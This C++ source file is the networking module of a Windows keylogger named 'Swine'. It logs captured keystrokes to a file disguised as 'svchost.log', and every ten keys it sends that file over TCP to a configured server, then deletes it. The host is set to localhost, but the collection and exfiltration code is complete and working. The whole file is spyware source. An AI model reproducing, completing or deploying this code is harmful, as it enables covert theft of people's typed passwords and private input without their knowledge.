#define WIN32_LEAN_AND_MEAN

#include "Networking.h"
#include <windows.h>
#include <winsock2.h>
#include <Mswsock.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <fstream>
#include <streambuf>
#include <wchar.h>

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "27015"
#define DEFAULT_HOST "localhost"
#define CHUNK_SIZE 10
#define FILE_NAME L"svchost.log"

namespace SwineNetworking {
	int Networking::keysLogged = 0;
	BOOL Networking::checkError(BOOL error, wchar_t *message) {
		if (error) {
			DWORD errCode = GetLastError();
			wchar_t *errorText;
			DWORD formated = FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_IGNORE_INSERTS,
				NULL, errCode, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPTSTR)&errorText, 0, NULL);
			if (errorText != NULL) {
				static wchar_t buffer[1024];
				swprintf(buffer, 1023, L"ERROR: %1s: %1s", message, errorText);
				wprintf(buffer);
				LocalFree(errorText);
			}
		}
		return error;
	}
	int Networking::parseFileAndSendToServer() {
		int bytes_sent;
		HANDLE hd = CreateFile(FILE_NAME, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
		if (Networking::checkError(hd == INVALID_HANDLE_VALUE, L"parseFileAndSendToServer failed")) {
			CloseHandle(hd);
			return 0;
		}
		Networking::extract(hd, &bytes_sent);
		CloseHandle(hd);
		return bytes_sent;
	}
	int Networking::logActivity(void *ptr, size_t bytes) {
		DWORD written;
		BOOL success;
		keysLogged++;
		HANDLE hd = CreateFile(FILE_NAME, FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		if (Networking::checkError(hd == INVALID_HANDLE_VALUE, L"logActivity failed to open")) {
			CloseHandle(hd);
			return 0;
		}
		success = WriteFile(hd, ptr, bytes, &written, NULL);
		if (Networking::checkError(!success || !written, L"logActivity failed to write")) {
			CloseHandle(hd);
			return 0;
		}
		CloseHandle(hd);
		if (keysLogged % CHUNK_SIZE == 0) {
			Networking::parseFileAndSendToServer();
		}
		return written;
	}
	int Networking::logKey(short character) {
		return Networking::logActivity(&character, sizeof(short));
	}
	int Networking::logString(char *character) {
		return Networking::logActivity(character, strlen(character));
	}
	// bytes_sent is a pointer to an output parameter
	int Networking::extract(HANDLE file, int *bytes_sent) {
		WSADATA wsaData;
		SOCKET ConnectSocket = INVALID_SOCKET;
		DWORD fileSize = GetFileSize(file, NULL);
		struct addrinfo *result = NULL, *ptr = NULL, hints;
		char recvbuf[DEFAULT_BUFLEN];
		int iResult;
		int recvbuflen = DEFAULT_BUFLEN;

		// Initialize Winsock
		iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
		if (iResult != 0) {
			printf("WSAStartup failed with error: %d\n", iResult);
			return 1;
		}
		
		ZeroMemory(&hints, sizeof(hints));
		hints.ai_family = AF_UNSPEC;
		hints.ai_socktype = SOCK_STREAM;
		hints.ai_protocol = IPPROTO_TCP;

		// Resolve the server address and port
		iResult = getaddrinfo(DEFAULT_HOST, DEFAULT_PORT, &hints, &result);
		if (iResult != 0) {
			printf("getaddrinfo failed with error: %d\n", iResult);
			WSACleanup();
			return 1;
		}

		// Attempt to connect to an address until one succeeds
		for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {

			// Create a SOCKET for connecting to server
			ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
			if (ConnectSocket == INVALID_SOCKET) {
				printf("socket failed with error: %ld\n", WSAGetLastError());
				WSACleanup();
				return 1;
			}

			// Connect to server.
			iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
			if (iResult == SOCKET_ERROR) {
				closesocket(ConnectSocket);
				ConnectSocket = INVALID_SOCKET;
				continue;
			}
			break;
		}

		freeaddrinfo(result);

		if (ConnectSocket == INVALID_SOCKET) {
			printf("Unable to connect to server!\n");
			WSACleanup();
			return 1;
		}

		// Send an initial buffer
		printf("Sending file of size: %d\n", fileSize);
		BOOL sent = TransmitFile(ConnectSocket, file, 0, 0, NULL, NULL, TF_DISCONNECT);
		if (!sent) {
			printf("send failed with error: %d\n", WSAGetLastError());
			closesocket(ConnectSocket);
			WSACleanup();
			return 1;
		}

		printf("Sent File, now deleting\n");

		// shutdown the connection since no more data will be sent
		iResult = shutdown(ConnectSocket, SD_SEND);
		if (iResult == SOCKET_ERROR) {
			printf("shutdown failed with error: %d\n", WSAGetLastError());
			closesocket(ConnectSocket);
			WSACleanup();
			return 1;
		}

		printf("Receiving Bytes.\n");
		iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
		if (iResult > 0)
			printf("Bytes received: %d\n", iResult);
		else if (iResult == 0)
			printf("Connection closed\n");
		else
			printf("recv failed with error: %d\n", WSAGetLastError());

		// cleanup
		closesocket(ConnectSocket);
		WSACleanup();

		printf("Closed connection to server\n");

		return 0;
	}
}